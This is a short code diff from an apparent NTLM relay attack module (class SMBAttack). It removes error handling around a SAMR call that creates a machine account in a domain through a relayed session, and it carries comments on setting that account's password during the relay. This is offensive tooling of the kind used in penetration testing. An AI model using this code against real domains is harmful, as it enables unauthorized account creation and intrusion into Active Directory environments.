@@ -96,18 +96,7 @@ class SMBAttack(ProtocolAttack):
                     else:
                         computerName = self.config.addComputerSMB[0]
 
-                    # Code from the addComputer.py script
-                    try:
-                        createUser = samr.hSamrCreateUser2InDomain(remoteOps.getSamr(), remoteOps.getDomainHandle(), computerName, samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE)
-                    except samr.DCERPCSessionError as e:
-                        if e.error_code == 0xc0000022:
-                            raise Exception("Relayed user doesn't have right to create a machine account!")
-                        elif e.error_code == 0xc00002e7:
-                            raise Exception("Relayed user machine quota exceeded!")
-                        elif e.error_code == 0xc0000062:
-                            raise Exception("Account name not accepted, maybe the '$' at the end is missing ?")
-                        else:
-                            raise e
+                    createUser = samr.hSamrCreateUser2InDomain(remoteOps.getSamr(), remoteOps.getDomainHandle(), computerName, samr.USER_WORKSTATION_TRUST_ACCOUNT, samr.USER_FORCE_PASSWORD_CHANGE)
 
                     # Account password setup. In the NTLM relay situation it is not possible to use 'hSamrSetPasswordInternal4New()' because an error for "STATUS_WRONG_PASSWORD" is raised
                     # For the moment, I'm not sure why this error is raised even with the "USER_FORCE_PASSWORD_CHANGE" access mask during a relay. Probably an encryption issue
